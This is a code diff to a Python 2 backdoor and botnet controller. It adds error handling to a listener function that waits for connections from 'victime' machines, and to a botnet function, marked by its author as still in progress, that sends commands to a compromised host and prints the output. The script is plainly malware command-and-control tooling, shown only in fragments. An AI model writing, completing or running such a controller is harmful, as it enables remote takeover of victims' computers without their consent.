@@ -7,10 +7,15 @@ import threading
 
 def listenbackdoor():
 	listening = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	host = raw_input('your ip address please: ')
-	port = input('your port: ') 
-	listening.bind((host, port))
-	print "listening on address: " + str(host) + "on port: " + str(port)
+	try:
+		host = raw_input('your ip address please: ')
+		port = input('your port: ') 
+		listening.bind((host, port))
+		print "listening on address: " + str(host) + "on port: " + str(port)
+		
+	except:
+		print "ip or port not available"
+		sys.exit(1)
 	while(True):
 		listening.listen(5)
 		(victime, (address, his_port)) = listening.accept()
@@ -41,8 +46,9 @@ def connectto_b0tnet(): #pas encore au point mais j'y travaille
 			connection.send(interaction)
 			data = connection.recv(1024)
 			print data
-		elif(interaction == "exit"): connection.close()
-
+		elif(interaction == "exit"): 
+			connection.close()
+			sys.exit(1)
 print(
 '__________ .__   __                  \n'
 '\______   \|__|_/  |_   ______ __ __ \n'
